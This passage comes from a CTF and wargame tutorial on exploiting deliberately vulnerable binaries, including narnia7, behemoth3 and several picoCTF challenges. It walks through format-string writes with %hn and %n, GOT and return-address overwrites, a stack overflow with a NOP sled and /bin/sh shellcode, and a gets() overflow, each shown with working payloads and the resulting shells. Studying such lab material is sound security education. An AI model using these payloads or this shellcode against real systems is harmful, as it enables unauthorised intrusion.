<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Way to go!!!!&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let’s run the program and see what are the address we get.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">narnia71</span> <span class="n">A</span>
<span class="n">goodfunction</span><span class="p">()</span> <span class="o">=</span> <span class="mh">0x804871f</span>
<span class="n">hackedfunction</span><span class="p">()</span> <span class="o">=</span> <span class="mh">0x8048745</span>

<span class="n">before</span> <span class="p">:</span> <span class="n">ptrf</span><span class="p">()</span> <span class="o">=</span> <span class="mh">0x804871f</span> <span class="p">(</span><span class="mh">0xffb4450c</span><span class="p">)</span>
<span class="n">I</span> <span class="n">guess</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">come</span> <span class="n">to</span> <span class="n">the</span> <span class="n">hackedfunction</span><span class="o">...</span>
<span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">goodfunction</span><span class="p">,</span> <span class="n">but</span> <span class="n">i</span> <span class="n">said</span> <span class="n">the</span> <span class="n">Hackedfunction</span><span class="o">..</span>
</pre></div>
</div>
<p>and</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia7@melinda:/narnia$ ./narnia7 A
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd64c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
</pre></div>
</div>
<p>The reason I have added two running instances is because in the first instance the address is different by one byte 0x1f and 0x45 where as in the second instance the address differs by two bytes 0x86e0 and 0x8706. We can write two bytes by %hn and one byte by %hhn. We can write whole 4 byte address by following a formula</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>If HOB &lt; LOB

HOB:0x0804
LOB:0x8706

[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
%[offset]$hn   = %6\$hn
%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
%[offset+1]$hn = %7\$hn

`python -c &#39;print &quot;\x4e\xd6\xff\xff\x4c\xd6\xff\xff&quot; +&quot;%.2044x%6\$hn %.32514x%7\$hn&quot;&#39;`
</pre></div>
</div>
<p>We also need to find the offset where the address is stored which can be done by two methods: Either compiling the program on local machine and checking the buffer just after snprintf</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ p buffer
$2 = &quot;AAAA.000008a2.f7fdeb58.f7fde860.0804835c.0804871f.41414141.3030302e.61383030&quot;, &#39;\000&#39; &lt;repeats 51 times&gt;
</pre></div>
</div>
<p>or by using ltrace</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia7@melinda:/narnia$ ltrace ./narnia7 `python -c &#39;print &quot;AAAA&quot; + &quot;.%08x&quot;*7&#39;`
__libc_start_main(0x804868f, 2, 0xffffd764, 0x8048740 &lt;unfinished ...&gt;
memset(0xffffd620, &#39;\0&#39;, 128)                                                                                          = 0xffffd620
printf(&quot;goodfunction() = %p\n&quot;, 0x80486e0goodfunction() = 0x80486e0
)                                                                             = 27

)                                                                         = 30
printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486e0, 0xffffd61cbefore : ptrf() = 0x80486e0 (0xffffd61c)
)                                                           = 41
puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...
printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048706hackedfunction() = 0x8048706
)                                                                            = 50
sleep(2)                                                                                                               = 0
snprintf(&quot;AAAA.08048238.ffffd678.f7ffda94.&quot;..., 128, &quot;AAAA.%08x.%08x.%08x.%08x.%08x.%0&quot;..., 0x8048238, 0xffffd678, 0xf7ffda94, 0, 0x80486e0, 0x41414141, 0x3038302e) = 67
puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                                                                            = 61
fflush(0xf7fcaac0)                                                                                                     = 0
exit(0 &lt;no return ...&gt;
+++ exited (status 0) +++
</pre></div>
</div>
<p>If you see 0x41414141 is at offset 6.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ p ptrf
$3 = (int (*)()) 0x804871f &lt;goodfunction&gt;
gdb-peda$ p &amp;ptrf
$4 = (int (**)()) 0xffffd2ec
gdb-peda$ x /10xb 0xfffd3ea
0xfffd3ea:  Cannot access memory at address 0xfffd3ea
gdb-peda$ x /10xb 0xffffd3ea
0xffffd3ea: 0x3f    0x77    0x00    0x00    0x00    0x00    0x00    0x00
0xffffd3f2: 0x00    0x00
gdb-peda$ x /10xb 0xffffd2ea
0xffffd2ea: 0x04    0x08    0x1f    0x87    0x04    0x08    0x41    0x41
0xffffd2f2: 0x41    0x41
gdb-peda$ p goodfunction
$5 = {int ()} 0x804871f &lt;goodfunction&gt;
gdb-peda$ p ha
hackedfunction  hasmntopt
gdb-peda$ p hackedfunction
$6 = {int ()} 0x8048745 &lt;hackedfunction&gt;
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ p &amp;ptrf
$10 = (int (**)()) 0xffffd2fc
gdb-peda$ run `python -c &#39;print &quot;\xfc\xd2\xff\xff&quot; + &quot;.%08x&quot;*5 + &quot;%hhn&quot;&#39;`
gdb-peda$ p ptrf
$12 = (int (*)()) 0x8048731 &lt;goodfunction+18&gt;
gdb-peda$ x /10xb 0xffffd2fa
0xffffd2fa: 0x04    0x08    0x31    0x87    0x04    0x08    0xfc    0xd2
0xffffd302: 0xff    0xff
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Let’s see another example Behemoth3 where we have only the assembly code of the program and we exploit this by two methods by overwriting the GOT address or overwriting the return address.</p></li>
</ul>
<blockquote>
<div><p>Assembly Source Code:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) disassemble main
Dump of assembler code for function main:
   0x0804847d &lt;+0&gt;: push   %ebp
   0x0804847e &lt;+1&gt;: mov    %esp,%ebp
   0x08048480 &lt;+3&gt;: and    $0xfffffff0,%esp
   0x08048483 &lt;+6&gt;: sub    $0xe0,%esp
   0x08048489 &lt;+12&gt;:    movl   $0x8048570,(%esp)
   0x08048490 &lt;+19&gt;:    call   0x8048330 &lt;printf@plt&gt;
   0x08048495 &lt;+24&gt;:    mov    0x80497a4,%eax
   0x0804849a &lt;+29&gt;:    mov    %eax,0x8(%esp)
   0x0804849e &lt;+33&gt;:    movl   $0xc8,0x4(%esp)
   0x080484a6 &lt;+41&gt;:    lea    0x18(%esp),%eax
   0x080484aa &lt;+45&gt;:    mov    %eax,(%esp)
   0x080484ad &lt;+48&gt;:    call   0x8048340 &lt;fgets@plt&gt;
   0x080484b2 &lt;+53&gt;:    movl   $0x8048584,(%esp)
   0x080484b9 &lt;+60&gt;:    call   0x8048330 &lt;printf@plt&gt;
   0x080484be &lt;+65&gt;:    lea    0x18(%esp),%eax
   0x080484c2 &lt;+69&gt;:    mov    %eax,(%esp)
   0x080484c5 &lt;+72&gt;:    call   0x8048330 &lt;printf@plt&gt;
   0x080484ca &lt;+77&gt;:    movl   $0x804858e,(%esp)
   0x080484d1 &lt;+84&gt;:    call   0x8048350 &lt;puts@plt&gt;
   0x080484d6 &lt;+89&gt;:    mov    $0x0,%eax
   0x080484db &lt;+94&gt;:    leave
   0x080484dc &lt;+95&gt;:    ret
End of assembler dump.
</pre></div>
</div>
<p>Observed Behavior:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>behemoth3@melinda:/tmp/rahul3$ ./behemoth3
Identify yourself: HelloCheck123
Welcome, HelloCheck123

aaaand goodbye again.
</pre></div>
</div>
<p>Well, we tried to provide a very large input to the Identify yourself, but it didn’t not gave a segmentation fault. Let’s try format string:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>behemoth3@melinda:/tmp/rahul3$ echo `python -c &#39;print &quot;A&quot;*4 + &quot;.%08x&quot;*7&#39;` | ./behemoth3
Identify yourself: Welcome, AAAA.000000c8.f7fcac20.00000000.00000000.f7ffd000.41414141.3830252e

aaaand goodbye again.
</pre></div>
</div>
<p>Trying simple format string provided us with the offset of our format string. Now we can write almost any address with any value with our input. Before that let’s put a environment variable shellcode and check it’s address:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\x90&quot;*90 + &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`
</pre></div>
</div>
<p>Let’s core dump the binary using %s and examine the core. Our shellcode can be reached at 0xffffd8f0</p>
<ul class="simple">
<li><p>Either we can overwrite the return address (main+95): Let’s debug the program set the breakpoint at main+95 and see the value of $esp which would be use to find the return address when binary is executed without gdb. The valueis 0xf7e3ba63 and the return address which needed to be overwrriten is 0xffffd65c. Let’s again core dump the binary to see the return address without gdb.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) find $esp,+2000,0xf7e3ba63
0xffffd66c
1 pattern found.
</pre></div>
</div>
<p>So, if we overwrite the return address at 0xffffd66c with our shellcode value of 0xffffd8f0, we should get a shell.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &quot;</span><span class="se">\x5e\xd6\xff\xff\x5c\xd6\xff\xff</span><span class="s1">&quot; +&quot;</span><span class="si">%.65527x</span><span class="s1">%6$hn </span><span class="si">%.55503x</span><span class="s1">%7$hn&quot;&#39;</span> <span class="o">&gt;</span> <span class="n">input98</span>
</pre></div>
</div>
<p>This is little tricky because we might have to guess the return address without gdb. Previously it was coming 0xffffd66c but we got shell using 0xffffd65c.</p>
</div></blockquote>
<ul class="simple">
<li><p>overwrite the puts GOT address: Find the GOT address of puts which is 0x08049790 and overwrite it with</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &quot;</span><span class="se">\x92\x97\x04\x08\x90\x97\x04\x08</span><span class="s1">&quot; +&quot;</span><span class="si">%.65527x</span><span class="s1">%6$hn </span><span class="si">%.55503x</span><span class="s1">%7$hn&quot;&#39;</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
<ul class="simple">
<li><p>In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">give_shell</span><span class="p">(){</span>
<span class="w">    </span><span class="kt">gid_t</span><span class="w"> </span><span class="n">gid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getegid</span><span class="p">();</span>
<span class="w">    </span><span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">);</span>
<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">secret</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">secret</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1337</span><span class="p">){</span>
<span class="w">        </span><span class="n">give_shell</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Reading the address</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>pico83515@shell:/home/format$ gdb -q format
Reading symbols from format...(no debugging symbols found)...done.
(gdb) p $secret
$1 = void
(gdb) p &amp;secret
$2 = (&lt;data variable, no debug info&gt; *) 0x804a030 &lt;secret&gt;
</pre></div>
</div>
<p>Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000
</pre></div>
</div>
<p>We see that the address is present on the stack at the seventh position. Otherwise, we can put it on the stack by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>for i in {1..256};do echo -n &quot;Offset: $i:&quot;; env -i ./format AAAA%$i\$x;echo ;done | grep 4141
</pre></div>
</div>
<p>What this is doing is “Extracting particular stack content by “%$i$x”. As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>or i in {1..256};do echo -n &quot;Offset: $i:&quot;; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
Offset: 103:AAAA41410074
Offset: 104:AAAA31254141
</pre></div>
</div>
<p>So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>for i in {1..256};do echo -n &quot;Offset: $i:&quot;; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
Offset: 103:AAAA41414141
</pre></div>
</div>
<p>It looks like the address 0x0804a030 is getting placed in *ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>pico1139@shell:/home/format$: env -i ./format $:`(python -c &#39;print &quot;\x30\xa0\x04\x08&quot;+&quot;%1333u%103`\ nAA&quot;&#39;)
$ id
uid=11066(pico1139) gid=1008(format) groups=1017(picogroup) $ ls
Makefile flag.txt format format.c $ cat flag.txt
who\_thought\_%n\_was\_a\_good\_idea?
</pre></div>
</div>
<p>Otherwise as the address at the seventh is already present on stack we can also do</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>plain pico83515@shell:/home/format$ ./format &quot;%1337u%7$n&quot;
</pre></div>
</div>
<p>We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="nb">format</span> <span class="o">%</span><span class="mi">08</span><span class="n">x</span><span class="o">.%</span><span class="mi">08</span><span class="n">x</span><span class="o">.%</span><span class="mi">08</span><span class="n">x</span><span class="o">.%</span><span class="mi">08</span><span class="n">x</span><span class="o">.%</span><span class="mi">08</span><span class="n">x</span><span class="o">.%</span><span class="mi">1292</span><span class="n">u</span><span class="o">%</span><span class="n">n</span>
</pre></div>
</div>
<p>If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see “%08x.” is of eight characters + 1 of “.” or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.</p>
</div></blockquote>
<ul class="simple">
<li><p>In another example below,</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="cp">#define BUFSIZE 256</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">greet</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="p">){</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;What is your name?&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">!&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">be_nice_to_people</span><span class="p">(){</span>
<span class="w">    </span><span class="kt">gid_t</span><span class="w"> </span><span class="n">gid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getegid</span><span class="p">();</span>
<span class="w">    </span><span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
<span class="w">    </span><span class="n">be_nice_to_people</span><span class="p">();</span>

<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;How long is your name?&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">BUFSIZE</span><span class="p">)</span><span class="w"> </span><span class="c1">//don&#39;t allow buffer overflow</span>
<span class="w">        </span><span class="n">greet</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Length was too long!&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there’s any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>pico1139@shell:/home/no_overflow$ (echo -1; python -c &#39;print &quot;A&quot;*268+&quot;\xd0\xd6\xff\xff&quot;+&quot;\x90&quot;*200+&quot; &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;&#39;; cat) | ./no_overflow
How long is your name?
What is your name?
Hello, AAAAAAAAAAAAAAAAAAAAAA...snip...

id
uid=11066(pico1139) gid=1007(no_overflow) groups=1017(picogroup)
cat flag.txt
what_is_your_sign
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string “not_the_flag.txt” as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">br</span> <span class="o">*</span><span class="n">puts</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048460</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">what_the_flag</span><span class="o">/</span><span class="n">what_the_flag</span>

<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0xf7e81ee0</span> <span class="ow">in</span> <span class="n">puts</span> <span class="p">()</span> <span class="kn">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x08048777</span>
<span class="mh">0x8048777</span><span class="p">:</span>  <span class="s2">&quot;not_the_flag.txt&quot;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x08048778</span>
<span class="mh">0x8048778</span><span class="p">:</span>  <span class="s2">&quot;ot_the_flag.txt&quot;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x08048770</span>
<span class="mh">0x8048770</span><span class="p">:</span>  <span class="s2">&quot;le: </span><span class="si">%s</span><span class="s2">&quot;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x0804877C</span>
<span class="mh">0x804877c</span><span class="p">:</span>  <span class="s2">&quot;he_flag.txt&quot;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x0804877D</span>
<span class="mh">0x804877d</span><span class="p">:</span>  <span class="s2">&quot;e_flag.txt&quot;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x0804877E</span>
<span class="mh">0x804877e</span><span class="p">:</span>  <span class="s2">&quot;_flag.txt&quot;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x0804877F</span>
<span class="mh">0x804877f</span><span class="p">:</span>  <span class="s2">&quot;flag.txt&quot;</span>
</pre></div>
</div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">message_data</span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">message</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">file_name</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">read_file</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">file_path</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">len</span><span class="p">){</span>
<span class="w">    </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">file</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">file</span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">)){</span>
<span class="w">        </span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">file</span><span class="p">);</span>
<span class="w">        </span><span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">        </span><span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Cannot read file: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">file_path</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">message_data</span><span class="w"> </span><span class="n">data</span><span class="p">;</span>
<span class="w">    </span><span class="n">data</span><span class="p">.</span><span class="n">file_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;not_the_flag.txt&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter your password too see the message:&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;1337_P455W0RD&quot;</span><span class="p">)){</span>
<span class="w">        </span><span class="n">read_file</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="n">file_name</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">));</span>
<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Incorrect password!&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual: gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\0’). No check for buffer overrun is performed (see BUGS below). So by using the following input, we can overwrite the file pointer and still provide the correct password:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">1337</span><span class="n">_P455W0RD</span>
<span class="mi">1337</span><span class="n">_P455W0RD</span>\<span class="mi">0</span><span class="n">aa</span>\<span class="n">x7f</span>\<span class="n">x87</span>\<span class="n">x04</span>\<span class="n">x08</span>
<span class="n">aa</span>\<span class="n">x7f</span>\<span class="n">x87</span>\<span class="n">x04</span>\<span class="n">x08</span>
</pre></div>
</div>
<p>We use this in the command line to get the flag</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>pico83515@shell:/home/what_the_flag$ printf &quot;1337_P455W0RD\0bb\x7f\x87\x04\x08&quot; | ./what_the_flag
Enter your password too see the message:
Congratulations! Here is the flag: who_needs_%eip

pico83515@shell:/home/what_the_flag$
</pre></div>
</div>
</div></blockquote>
</section>
<section id="miscellanous-examples">
<h3>Miscellanous Examples<a class="headerlink" href="#miscellanous-examples" title="Link to this heading"></a></h3>
<p>Let’s see some miscellanous examples away from Buffer/Format Vulnerabilities.</p>
<ul class="simple">
